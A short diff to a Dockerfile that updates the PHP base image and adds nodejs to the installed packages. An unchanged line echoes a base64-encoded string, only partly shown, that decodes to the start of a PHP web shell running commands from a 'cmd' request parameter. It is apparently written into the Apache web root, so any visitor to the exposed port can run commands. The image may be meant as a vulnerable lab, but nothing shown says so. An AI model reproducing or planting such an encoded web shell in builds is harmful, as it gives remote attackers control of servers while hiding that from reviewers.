@@ -1,4 +1,4 @@
-FROM php:7.4.27-apache
+FROM php:8.2.12-apache
 
 WORKDIR /var/www/html
 
@@ -6,7 +6,7 @@ RUN echo "PD9waHAgaWYoaXNzZXQoJF9SRVFVRVNUWydjbWQnXSkpeyBlY2hvICI8cHJlPiI7ICRjbW
 
 RUN apt update
 
-RUN apt install python3 ruby golang -y
+RUN apt install python3 ruby golang nodejs -y
 
 EXPOSE 80
 
